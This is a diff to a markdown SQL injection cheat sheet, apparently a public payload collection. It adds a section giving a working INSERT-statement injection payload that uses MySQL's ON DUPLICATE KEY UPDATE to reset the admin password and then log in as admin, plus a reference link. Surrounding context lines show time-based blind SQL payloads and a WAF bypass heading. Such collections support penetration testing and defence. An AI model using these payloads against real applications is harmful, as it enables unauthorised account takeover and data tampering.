@@ -187,6 +187,22 @@ SQL Server : IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'                    
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
+## Insert Statement - ON DUPLICATE KEY UPDATE 
+ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
+```
+Inject using payload:
+  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
+ 
+The query would look like this:
+INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
+ 
+This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”. 
+Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".
+ 
+After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
+```
+
+
 ## WAF Bypass
 
 No Space (%20) - bypass using whitespace alternatives
@@ -300,3 +316,4 @@ mysql> mysql> select version();
   - [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
   - [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
   - [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
+  - [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
